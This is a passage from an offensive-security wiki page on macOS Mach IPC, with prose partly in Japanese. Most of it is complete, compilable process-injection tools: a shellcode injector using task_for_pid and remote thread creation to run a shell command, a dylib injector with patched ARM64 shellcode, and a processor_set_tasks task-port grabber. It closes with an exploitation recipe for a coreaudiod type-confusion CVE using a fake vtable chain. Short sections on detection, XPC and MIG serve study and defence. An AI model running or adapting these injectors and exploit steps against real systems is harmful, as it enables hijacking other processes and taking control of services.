char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
> [!TIP]
> これをiOSで動作させるには、書き込み可能なメモリを実行可能にするための entitlement `dynamic-codesigning` が必要です。

### Task port 経由のスレッド内での Dylib Injection

macOSでは、**threads** は **Mach** を介して、または **posix `pthread` api** を使用して操作できます。前回の injection で生成したスレッドは Mach api を使って生成したため、**it's not posix compliant**。

コマンドを実行するために **inject a simple shellcode** を注入できたのは、**didn't need to work with posix** であり、Mach のみで十分だったからです。**More complex injections** を行うには、**thread** も **posix compliant** である必要があります。

したがって、スレッドを改善するには、`pthread_create_from_mach_thread` を呼び出して **create a valid pthread** する必要があります。次に、この新しい pthread は **call dlopen** してシステムから **load a dylib** できるため、新しい shellcode を書く代わりにカスタムライブラリをロードして様々な処理を実行できます。

以下の場所に **example dylibs** を見つけることができます（たとえばログを生成してそれを監視できるものなど）:

{{#ref}}
../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Thread Hijacking via Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

この手法ではプロセスのスレッドがハイジャックされます：

{{#ref}}
macos-thread-injection-via-task-port.md
{{#endref}}

### Task Port Injection Detection

`task_for_pid` や `thread_create_*` を呼び出すと、カーネル内の struct task にあるカウンタが増加します。このカウンタはユーザーモードから task_info(task, TASK_EXTMOD_INFO, ...) を呼び出して参照できます。

## Exception Ports

スレッドで例外が発生すると、その例外はスレッドに割り当てられた例外ポートに送られます。スレッドが処理しない場合はタスクの例外ポートに送られ、タスクも処理しない場合は launchd によって管理されるホストポートに送られ（そこでアクノレッジされます）。これを例外の振り分け（exception triage）と呼びます。

通常、適切に処理されない場合、最終的にレポートは ReportCrash デーモンによって処理されます。ただし、同じタスク内の別スレッドが例外を処理することも可能で、これが `PLCreashReporter` のようなクラッシュ報告ツールが行うことです。

## Other Objects

### クロック

任意のユーザがクロックの情報にアクセスできますが、時刻を設定したりその他の設定を変更するには root 権限が必要です。

情報を取得するには、`clock` サブシステムの関数（`clock_get_time`, `clock_get_attributtes`, `clock_alarm` など）を呼び出すことができます。値を変更するには `clock_priv` サブシステムの `clock_set_time` や `clock_set_attributes` のような関数を使用します。

### プロセッサとプロセッサセット

processor API により、`processor_start`, `processor_exit`, `processor_info`, `processor_get_assignment` のような関数を呼び出して単一の論理プロセッサを制御できます。

さらに、**processor set** API は複数のプロセッサをグループ化する手段を提供します。デフォルトの processor set は **`processor_set_default`** を呼び出して取得できます。  
以下は processor set とやり取りする際に興味深い API です:

- `processor_set_statistics`
- `processor_set_tasks`: Return an array of send rights to all tasks inside the processor set
- `processor_set_threads`: Return an array of send rights to all threads inside the processor set
- `processor_set_stack_usage`
- `processor_set_info`

As mentioned in [**this post**](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/), in the past this allowed to bypass the previously mentioned protection to get task ports in other processes to control them by calling **`processor_set_tasks`** and getting a host port on every process.  
Nowadays you need root to use that function and this is protected so you will only be able to get these ports on unprotected processes.

You can try it with:

<details>

<summary><strong>processor_set_tasks のコード</strong></summary>
````c
// Maincpart fo the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:


{{#ref}}
macos-xpc/
{{#endref}}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:


{{#ref}}
macos-mig-mach-interface-generator.md
{{#endref}}

## MIG handler type confusion -> fake vtable pointer-chain hijack

If a MIG handler **retrieves a C++ object by Mach message-supplied ID** (e.g., from an internal Object Map) and then **assumes a specific concrete type without validating the real dynamic type**, later virtual calls can dispatch through attacker-controlled pointers. In `coreaudiod`’s `com.apple.audio.audiohald` service (CVE-2024-54529), `_XIOContext_Fetch_Workgroup_Port` used the looked-up `HALS_Object` as an `ioct` and executed a vtable call via:

```asm
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x168]  ; indirect call through vtable slot
```

Because `rax` comes from **multiple dereferences**, exploitation needs a structured pointer chain rather than a single overwrite. One working layout:

1. In the **confused heap object** (treated as `ioct`), place a **pointer at +0x68** to attacker-controlled memory.
2. At that controlled memory, place a **pointer at +0x0** to a **fake vtable**.
3. In the fake vtable, write the **call target at +0x168**, so the handler jumps to attacker-chosen code when dereferencing `[rax+0x168]`.

Conceptually:

```
HALS_Object + 0x68  -> controlled_object
*(controlled_object + 0x0) -> fake_vtable
*(fake_vtable + 0x168)     -> RIP target
```

### LLDB triage to anchor the gadget

1. **Break on the faulting handler** (or `mach_msg`/`dispatch_mig_server`) and trigger the crash to confirm the dispatch chain (`HALB_MIGServer_server -> dispatch_mig_server -> _XIOContext_Fetch_Workgroup_Port`).
2. In the crash frame, disassemble to capture the **indirect call slot offset** (`call qword ptr [rax + 0x168]`).
3. Inspect registers/memory to verify where `rdi` (base object) and `rax` (vtable pointer) originate and whether the offsets above are reachable with controlled data.
4. Use the offset map to heap-shape the **0x68 -> 0x0 -> 0x168** chain and convert the type confusion into a reliable control-flow hijack inside the Mach service.

## References

- [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
- [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [*OS Internals, Volume I, User Mode, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)
- [https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html)
- [Project Zero – Sound Barrier 2](https://projectzero.google/2026/01/sound-barrier-2.html)
{{#include ../../../../banners/hacktricks-training.md}}
